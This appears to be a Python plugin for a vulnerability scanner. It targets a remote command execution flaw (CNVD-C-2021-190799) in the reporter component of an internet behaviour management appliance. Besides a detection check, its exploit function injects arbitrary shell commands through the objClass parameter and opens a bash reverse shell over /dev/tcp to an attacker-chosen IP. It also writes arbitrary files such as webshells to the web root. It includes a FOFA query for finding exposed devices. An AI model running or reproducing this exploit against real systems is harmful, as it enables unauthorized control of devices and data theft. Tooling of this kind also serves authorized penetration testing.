# -*- coding: UTF-8 -*-
#!/usr/bin/python
import urllib.parse
import requests,base64
requests.packages.urllib3.disable_warnings()
def vuln_info():
    info={
        'vuln_name': 'reporter组件RCE',  #漏洞名称
        'vuln_referer':'无',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'上网行为管理',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''统一上网行为管理与审计系统产品在连接互联网后，攻击者利用"reporter组件存在远程命令执行漏洞”获取设备控制权限，执行非法操作。''',
        'vuln_identifier':'''CNVD-C-2021-190799''',
        'vuln_class':'远程命令执行',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''无''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="Login @ Reporter"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":""}
        vuln_url =url+"/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27qaxnb666%27%3E/var/www/reporter/view/Behavior/qaxnb666.txt%0a"        
        r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
        
        if r.status_code==200:
            vuln_url=url+'/view/Behavior/qaxnb666.txt'
            r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
            if r.status_code==200 and  'qaxnb666' in r.text:
                result['Result']= True
                result['Result_Info']= vuln_url
            else:
                result['Result_Info']= '不存在'
        else:
            
            result['Result_Info']= '不存在'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    
    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头 
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"不存在"}
        #命令执行
        if exp_data['type']=='cmd':
            vuln_url =url+"/view/Behavior/toQuery.php?method=getList&objClass=%0a"+exp_data['command']+"%3E/var/www/reporter/view/Behavior/qaxnb666.txt%0a"        
            result['Debug_Info'] = vuln_url
            r = requests.get(vuln_url,headers=heads, verify=False,timeout=10)
            if r.status_code==200:
                vuln_url=url+'/view/Behavior/qaxnb666.txt'
                r = requests.get(vuln_url,headers=heads, verify=False,timeout=10)
                if r.status_code==200:
                    result['Result']= True
                    result['Result_Info']= r.text
        #反弹shell    
        if exp_data['type']=='shell':
            vuln_url =url+"/view/Behavior/toQuery.php?method=getList&objClass=%0abash%20-i%20>&%20/dev/tcp/"+exp_data['reverse_ip']+"/"+str(exp_data['reverse_port'])+"%200>&1%0a"
            result['Debug_Info'] = vuln_url
            r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
            if r.status_code==200:
                result['Result'] = True
                result['Result_Info'] = "反弹成功"
        #上传文件    
        if exp_data['type']=='uploadfile':
            # base64_file_data =base64.b64encode(exp_data['filename_contents'].encode()).decode()
            exp_data['filename_contents'] = urllib.parse.quote(exp_data['filename_contents'])
            vuln_url =url+"/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20-e%20'"+exp_data['filename_contents']+"'%20%20%3E/var/www/reporter/view/Behavior/"+exp_data['filename']+"%0a"        
            result['Debug_Info'] = vuln_url
            r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
            if r.status_code==200:
                vuln_url=url+'/view/Behavior/'+exp_data['filename']
                r = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
                if r.status_code==200:
                    result['Result']= True
                    result['Result_Info'] = "上传成功，地址:"+vuln_url
            else:
                result['Debug_Info'] = '返回状态码:'+str(r.status_code)



        # 
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
